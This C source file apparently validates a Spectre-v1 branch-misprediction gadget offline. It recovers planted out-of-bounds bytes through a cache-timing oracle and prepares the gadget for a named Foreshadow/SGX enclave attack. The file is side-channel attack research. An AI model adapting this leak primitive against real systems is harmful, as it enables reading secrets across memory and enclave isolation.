/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Offline validation of the SHARED Kocher misprediction gadget
 *  (mispredict_gadget.h) -- the exact leak that will run live in
 *  foreshadow-ssa-warm.c, only here the target byte is PRESENT (no L1TF, no SGX,
 *  no root). Confirms the gadget mispredicts, the split oracle decodes the
 *  speculatively-read value, and the train-class + SSA-set exclusions hold.
 *
 *  Build (on .86):  gcc -O2 -I$HOME/sgx-step selftest-mispredict2.c -o selftest-mispredict2
 *  Run:             ./selftest-mispredict2         (TRIES=100 default)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>

#define MP_SLOT_SIZE 0x1040
#include "mispredict_gadget.h"

#define LO_CLASSES 64
#define HI_CLASSES 4
#define ARRAY_LEN  1024
#define SECRET_IDX 300           /* > mp_bound -> out of bounds -> mispredicted read */

/* the single definitions the shared header declares extern */
volatile long  mp_bound = 256;
uint8_t       *mp_array;
char *volatile mp_oracle;

char __attribute__((aligned(0x1000))) oracle_lo[MP_SLOT_SIZE * LO_CLASSES];
char __attribute__((aligned(0x1000))) oracle_hi[MP_SLOT_SIZE * HI_CLASSES];
static uint8_t array_backing[ARRAY_LEN];

int main(void)
{
    int tries = getenv("TRIES") ? atoi(getenv("TRIES")) : 100;
    if (tries < 1) tries = 1;

    cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) { CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof(set), &set); }

    mp_array = array_backing;
    for (int i = 0; i < ARRAY_LEN; i++) mp_array[i] = (uint8_t) i;

    int ssa_set = mp_set_of(&mp_array[SECRET_IDX]);
    printf("Kocher-mispredict self-test: tries=%d, bound=%ld, malicious_idx=%d, secret set=%d, oracle base_set=%d\n",
           tries, mp_bound, SECRET_IDX, ssa_set, mp_set_of(oracle_lo));

    int ok = 0, fails = 0;
    for (int v = 0; v < 256; v++)
    {
        mp_array[SECRET_IDX] = (uint8_t) v;
        int lo = mp_leak_class(0, SECRET_IDX, oracle_lo, LO_CLASSES, ssa_set, tries);
        int hi = mp_leak_class(1, SECRET_IDX, oracle_hi, HI_CLASSES, ssa_set, tries);
        int rec = ((hi & 3) << 6) | (lo & 0x3f);
        if (rec == v) ok++;
        else {
            if (fails < 12)
                printf("  [FAIL] v=0x%02x (lo=%d hi=%d) -> 0x%02x\n", v, v & 0x3f, v >> 6, rec);
            fails++;
        }
    }
    printf("RESULT: %d/256 via Kocher misprediction + split oracle (%d fail)\n", ok, fails);
    return 0;
}
